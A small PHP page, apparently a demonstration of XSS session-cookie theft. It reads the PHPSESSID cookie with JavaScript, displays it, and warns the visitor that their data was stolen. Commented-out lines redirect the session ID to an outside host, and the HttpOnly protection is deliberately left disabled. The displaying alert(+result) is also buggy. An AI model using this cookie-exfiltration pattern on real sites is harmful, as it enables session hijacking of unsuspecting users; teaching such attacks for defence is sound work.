<?php
session_start();
//ini_set("session.cookie_httponly", 1);//set cookie httponly

$sid = session_name() . "=" . session_id();

//header('Location: http://2013.skriptkoder.com/xss.php?' . $sid);
// header('Set-Cookie: name=PHPSESSID; httpOnly; Location:login.php');
//header('Location: login.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>xss</title>
	<script>
	//Get cookie routine by Shelley Powers
	function get_cookie(Name) {
	  var search = Name + "="
	  var returnvalue = "";
	  if (document.cookie.length > 0) {
		offset = document.cookie.indexOf(search)
		// if cookie exists
		if (offset != -1) {
		  offset += search.length
		  // set index of beginning of value
		  end = document.cookie.indexOf(";", offset);
		  // set index of end of cookie value
		  if (end == -1) end = document.cookie.length;
		  returnvalue=unescape(document.cookie.substring(offset, end))
		  }
	   }
	  return returnvalue;
	}

	var result=get_cookie("PHPSESSID");
alert(+result);

	//document.location='http://2013.skriptkoder.com/xss.php?cookieValue='+result
	</script>
</head>

<body>
    <div >
	Your informations has been stealin from another site<br/>
	BEWARE<br/>
	This is your cookie value: <?php echo $sid; ?> <br />
	look in the url
	</div>
</body>
</html>